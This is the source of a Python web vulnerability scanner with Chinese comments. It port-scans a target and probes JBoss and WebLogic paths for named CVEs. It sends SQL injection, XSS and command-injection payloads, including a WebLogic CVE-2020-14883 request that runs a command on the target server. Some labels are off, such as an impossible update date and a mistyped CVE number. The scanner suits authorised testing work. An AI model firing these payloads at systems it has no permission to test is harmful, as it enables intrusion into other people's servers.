# -code: utf-8-
# Filename: main.py
# Program_name: Web-Easy-Scanner
# Author: ES
# Last UpDate: 2025/4/31
# Version: 1.1.5

import html
import os
import sys
import random
import socket
import time
import subprocess
import platform
import requests
import threading
import tqdm
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# ========================== 配色打印函数 ==========================
def print_red(text):
    print(f"\033[31m{text}\033[0m")

def print_green(text):
    print(f"\033[32m{text}\033[0m")

def print_yellow(text):
    print(f"\033[33m{text}\033[0m")

def print_blue(text):
    print(f"\033[34m{text}\033[0m")

def print_purple(text):
    print(f"\033[35m{text}\033[0m")

# ========================== 漏洞路径列表 ==========================
JBOSS_PATHS = [
    '/jmx-console',
    '/web-console',
    '/invoker/JMXInvokerServlet',
    '/admin-console',
    '/jbossmq-httpil/HTTPServerILServlet',
    '/invoker/readonly'
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
}

DISCLAIMER = """
\033[31m免责声明：本工具仅限合法授权测试，作者不对任何非法用途负责。\033[0m
\033[34m可以使用"Download_support_library.py" 来下载该程序运行所需要的依赖库\033[0m"""

# ========================== 工具函数 ==========================
def resolve_domain(target):
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        return None

def get_base_url(url):
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"

def ping_ip(ip):
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    cmd = ['ping', param, '3', ip]
    subprocess.run(cmd)

# ========================== 扫描函数 ==========================
def scan_ports(ip, start=None, end=None):
    lock = threading.Lock()
    open_ports = []

    # 默认常见端口列表
    default_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
        445, 1433, 1521, 3306, 3389, 6379, 8080, 8443
    ]

    # 判断使用范围还是默认
    if start is not None and end is not None:
        port_list = list(range(start, end + 1))
        print_green(f"\n开始扫描 {ip} 的端口范围：{start} - {end}\n")
    else:
        port_list = default_ports
        print_green(f"\n未指定范围，使用默认常见端口扫描 {ip}：\n")

    progress = tqdm.tqdm(total=len(port_list), desc="扫描进度", ncols=70)

    def scan_single_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = 'unknown'
                    with lock:
                        open_ports.append((port, service))
                        print_green(f"[端口开放] {port:<5} 服务: {service}")
        except Exception as e:
            with lock:
                print_red(f"[错误] 端口 {port} 扫描失败：{e}")
        finally:
            progress.update(1)

    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in port_list:
            executor.submit(scan_single_port, port)

    progress.close()

    if open_ports:
        print_green("\n扫描完成！开放端口如下：")
        port_all_list = []
        for port, service in open_ports:
            print_green(f" - {port:<5} 服务: {service}")
            port_all_list.append(port)
        return port_all_list
    else:
        print_red("\n未发现开放端口喵～")
        return [None]

# ========================== JBoss 漏洞检查 ==========================
def scan_jboss(base_url):
    print_blue("\n[+] 正在扫描 JBoss 漏洞")
    results = []
    for path in JBOSS_PATHS:
        url = base_url + path
        try:
            resp = requests.get(url, headers=HEADERS, timeout=3, verify=False)
            if resp.status_code == 401 and "jmx" in path:
                msg = f"jmx-console 可能存在漏洞！地址: {url}"
                print_purple(f"[警告] {msg}")
                results.append(msg)
            elif resp.status_code == 200:
                if "admin" in path:
                    msg = f"admin-console 可能存在漏洞！地址: {url}"
                elif "JMXInvokerServlet" in path:
                    msg = f"CVE-2015-7501 JMXInvokerServlet 漏洞！地址: {url}"
                elif "jbossmq" in path:
                    msg = f"CVE-2017-7504 JBOSSMQ 漏洞！地址: {url}"
                else:
                    msg = f"未知漏洞地址: {url}"
                print_purple(f"[警告] {msg}")
                results.append(msg)
            elif resp.status_code == 500 and "readonly" in path:
                msg = f"CVE-2017-12149 可能存在漏洞！地址: {url}"
                print_purple(f"[警告] {msg}")
                results.append(msg)
        except:
            continue
    return results


# ========================== WebLogic 漏洞检查 ==========================
def scan_weblogic(base_url,ip):
    print_blue("\n[+] 正在扫描 WebLogic 漏洞")
    results = []

    def check(path, vuln_name):
        url = f"{base_url}{path}" if base_url.endswith('/') else f"{base_url}/{path}"
        try:
            resp = requests.get(url, headers=HEADERS, timeout=3, verify=False)
            if resp.status_code in [200, 403]:
                msg = f"[WebLogic] 可能存在 {vuln_name} 漏洞！地址: {url}"
                print_purple(msg)
                results.append(msg)
        except Exception as e:
            err = f"[WebLogic] 访问失败 {url}，错误: {e}"
            print_red(err)
            results.append(err)

    def detect_cve_2016_0638(ip, timeout=5, delay=1):
        """
        检测 WebLogic CVE-2016-0638 T3 反序列化漏洞
        """
        ports = [7001,7002,9001,5556,7101,7201]
        handshake = bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a')

        try:
            for port in ports:
                time.sleep(random.random())
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(timeout)
                    sock.connect((ip, port))
                    sock.send(handshake)
                    time.sleep(delay)
                    _ = sock.recv(1024)

                    # 发送一段可识别的 Payload，带有 weblogic.jms 标记类名（简单模拟）
                    test_payload = bytes.fromhex(
                        "000000acaced00057372002b7765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c"
                        "b88de4d93cbd45d0c000078707a000003f728200000000000000100000578"  # 这个只是特征探测，不会造成危害
                    )
                    sock.send(test_payload)
                    time.sleep(delay)

                    try:
                        res = sock.recv(4096)
                        if b"weblogic.jms.common.StreamMessageImpl" in res:
                            results.append(f"[+] {ip}:{port} 可能存在 CVE-2016-0638 漏洞")
                            return True, f"[+] {ip}:{port} 可能存在 CVE-2016-0638 漏洞"
                        else:
                            pass
                    except socket.timeout:
                        print(f"无响应（可能存在防护）")
            return "可能存在保护或无漏洞"

        except Exception as e:
            return False, f"[!] 连接 {ip}:{ports} 失败：{e}"

    def CVE_2020_14750(base_url):
        paths = [
            '/images/%252E./console.portal',
            '/images/%252e%252e%252fconsole.portal',
            '/css/%252E./console.portal',
            '/css/%252e%252e%252fconsole.portal',
            '/console/images/%252E./console.portal',
            '/console/images/%252e%252e%252fconsole.portal',
            '/console/css/%252E./console.portal',
            '/console/css/%252e%252e%252fconsole.portal', ]

        for path in paths:
            try:
                url = f"{base_url}{path}" if base_url.endswith('/') else f"{base_url}/{path}"
                r = requests.get(url,headers=HEADERS, timeout=3)
                if 'id="welcome"' in r.text:
                    msg = f"[+] 可能存在CVE-2020-14750漏洞 {r.url}"
                    results.append(msg)
                    print_purple(msg)
                    return

            except Exception as e:
                print_red(f"CVE_2020_14750报错：「{e}」")

    check("login/LoginForm.jsp","Console")
    check("uddiexplorer/SearchPublicRegistries.jsp", "SSRF")
    check("ws_utc/config.do", "CVE-2018-2894")
    check("_async/AsyncResponseService", "CVE-2019-1725")
    check("console/css/%252e%252e%252fconsole.portal","CVE-2020-14882")
    check("console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)",
          "CVE-2020-14883")
    check("uddiexplorer/SearchPublicRegistries.jsp","CVE-2014_4210")
    CVE_2020_14750(base_url)
    detect_cve_2016_0638(ip)

    return results

# ========================== SQL I  ============================
def scan_sql(url):
    result_list = []
    if "?" in url:
        re_url = url + "'"
    else:
        re_url = url + "?id=1'"
    print_blue("\n[+] 正在扫描 SQL注入 漏洞")
    try:
        r = requests.get(re_url, headers=HEADERS, timeout=3, verify=False)
        if r.status_code == 200 and ("sql" in r.text.lower() or "error" in r.text.lower()):
            msg = f"[SQL]可能存在漏洞: {re_url}"
            print_purple(msg)
            result_list.append(msg)
        else:
            print_blue("[SQL]未发现漏洞")
    except Exception as e:
        err = f"[SQL] 扫描错误: {e}"
        print_red(err)
        result_list.append(err)
    return result_list


# ========================= 敏感信息泄露 =========================

def sensitive(base_url):
    print_blue("\n[+] 正在扫描 敏感信息泄露 漏洞")
    results = []

    se_list = [
        "/.env",
        "/.git",
        "/config",
        "/config.php",
        "/db.sql",
    ]
    norm_list = [
        "/admin",
        "/login",
        "/backup",
        "/.git",
    ]

    for i in se_list:
        try:
            r = requests.get(f"{base_url}{i}", headers=HEADERS, timeout=3, verify=False)
            if r.status_code == 200:
                msg = f"[敏感信息] 可能存在权限问题：{base_url}{i}"
                print_purple(msg)
                results.append(msg)
        except Exception:
            pass
        time.sleep(random.randint(0, 2))

    for i in norm_list:
        try:
            r = requests.get(f"{base_url}{i}", headers=HEADERS, timeout=3, verify=False)
            if r.status_code == 200:
                msg = f"[敏感信息] 可能存在敏感路径暴露：{base_url}{i}"
                print_purple(msg)
                results.append(msg)
        except Exception:
            pass
        time.sleep(random.randint(0, 2))

    return results

# ========================= XSS检测 ============================

def detect_xss(url):
    print_blue("\n[+] 正在扫描 XSS注入 漏洞")
    results = []

    xss_payloads = [
        "<script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "\" onfocus=alert(1) autofocus x=\""
    ]

    def run(url, param=''):
        for payload in xss_payloads:
            full_url = f"{url}{param}={payload}"
            try:
                res = requests.get(full_url, timeout=5, verify=False)
                if payload in res.text:
                    msg = f"[XSS] 可能存在XSS漏洞：{full_url}"
                    print_purple(msg)
                    results.append(msg)
                    return
            except Exception as e:
                err = f"[XSS] 请求出错：{e}"
                print_red(err)
                results.append(err)

    if "?" in url:
        run(url)
    else:
        run(url, param='?id')

    return results

# ========================= 命令注入 ===========================
def detect_cmdi(url):
    print_blue("\n[+] 正在扫描 命令注入 漏洞")
    results = []

    payloads = [
        "test; whoami", "test && whoami", "test | whoami",
        "test`whoami`", "test$(whoami)"
    ]
    indicators = ["root", "uid=", "admin", "bash", "/home", "sh"]

    def run(url, param=''):
        for payload in payloads:
            full_url = f"{url}{param}={payload}"
            try:
                res = requests.get(full_url, timeout=5, verify=False)
                if any(key in res.text.lower() for key in indicators):
                    msg = f"[命令注入] 可能存在命令注入漏洞：{full_url}"
                    print_purple(msg)
                    results.append(msg)
                    return  # 检测到后不再继续多余请求
            except Exception as e:
                err = f"[命令注入] 请求失败：{e}"
                print_red(err)
                results.append(err)

    if "?" in url:
        run(url)
    else:
        run(url, param='?id')

    return results

# ========================== 报告生成 ===========================

def report(data: dict):
    filename = f"scan_report_{time.strftime('%Y%m%d_%H%M%S')}.html"
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>Web-Easy-Scanner 扫描报告</title>
<style>
    body {{
        background-color: #1e1e2f;
        color: #ffffff;
        font-family: 'Segoe UI', sans-serif;
        padding: 40px;
        animation: fadeIn 1s ease-in-out;
    }}
    @keyframes fadeIn {{
        from {{ opacity: 0; transform: translateY(10px); }}
        to {{ opacity: 1; transform: translateY(0); }}
    }}
    h1 {{
        color: #72c3ff;
        text-align: center;
        margin-bottom: 30px;
    }}
    .section {{
        background-color: #2a2a3d;
        border-radius: 12px;
        padding: 20px;
        margin-bottom: 20px;
        box-shadow: 0 0 10px rgba(114, 195, 255, 0.3);
    }}
    .section h2 {{
        color: #ffca7a;
        border-bottom: 1px solid #444;
        padding-bottom: 5px;
        margin-bottom: 10px;
    }}
    ul {{
        padding-left: 20px;
    }}
    li {{
        margin-bottom: 5px;
    }}
</style>
</head>
<body>
    <h1>Web-Easy-Scanner 扫描报告</h1>
""")
            for key, value in data.items():
                f.write(f'<div class="section">\n<h2>{html.escape(str(key))}</h2>\n')
                if isinstance(value, list):
                    if not value or value == [None]:
                        f.write("<p>（无数据）</p>")
                    else:
                        f.write("<ul>\n")
                        for item in value:
                            f.write(f"<li>{html.escape(str(item))}</li>\n")
                        f.write("</ul>\n")
                else:
                    f.write(f"<p>{html.escape(str(value))}</p>\n")
                f.write('</div>\n')
            f.write("</body></html>")
        print_green(f"\n✨ HTML 报告已生成：{filename}")
        os.system(f"start {filename}" if platform.system() == "Windows" else f"open {filename}")
    except Exception as e:
        print_red(f"[报告生成错误] 无法保存 HTML 报告：{e}")

# ========================== 主程序入口 ==========================
def main():
    print(DISCLAIMER)
    requests.packages.urllib3.disable_warnings()

    url = input("\n请输入目标网址（如 http://example.com）: ").strip()
    base_url = get_base_url(url)
    domain = urlparse(url).netloc
    ip = resolve_domain(domain)

    if not ip:
        print_red("[错误] 域名无法解析，请检查输入的网址是否正确。")
        return

    try:
        port_range = input("请输入端口范围（如 1-1000，直接回车则默认常见端口）：").strip()

        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
            port_list = scan_ports(ip, start, end)
        else:
            port_list = scan_ports(ip)  # 默认端口列表
    except:
        print_red("[错误] 端口号应为整数。")
        return

    jboss_result = scan_jboss(base_url)
    sensitive_result = sensitive(base_url)
    sql_result = scan_sql(url)
    xss_result = detect_xss(url)
    cmdi_result = detect_cmdi(url)
    weblogic_result = scan_weblogic(base_url,ip)

    report_dis = {
        "目标网址": url,
        "解析IP": ip,
        "开放端口": port_list,
        "JBoss 漏洞": jboss_result,
        "WebLogic 漏洞": weblogic_result,
        "敏感信息泄露": sensitive_result,
        "SQL 注入漏洞": sql_result,
        "XSS 漏洞": xss_result,
        "命令注入漏洞": cmdi_result,
        "扫描时间": time.strftime('%Y-%m-%d %H:%M:%S'),
        "提示": "以上结果基于特征判断，需进一步人工分析确认",
    }

    report(report_dis)
    input("\n扫描完成，按回车退出...")

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print_red(f"总程序运行时发生致命错误: {e}")
        input("按回车退出...")
